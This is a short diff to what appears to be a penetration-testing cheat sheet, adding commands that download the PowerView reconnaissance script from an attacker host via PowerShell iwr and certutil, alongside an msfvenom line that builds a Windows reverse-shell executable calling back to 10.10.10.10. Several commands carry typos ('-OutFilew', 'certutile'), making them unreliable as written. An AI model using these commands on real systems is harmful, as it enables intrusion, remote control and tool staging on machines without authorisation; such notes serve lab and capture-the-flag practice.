@@ -1,3 +1,8 @@
+# Download file
+	iwr http://10.10.10.10:8000/PowerView.ps1 -OutFilew C:\Windows\Temp\PowerView.ps1
+
+ 	certutile -urlcache -split -f http://10.10.10.10:8080/PowerView.ps1 PowerView.ps1
+
 # mfsvenom
 
 	msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o rev.exe
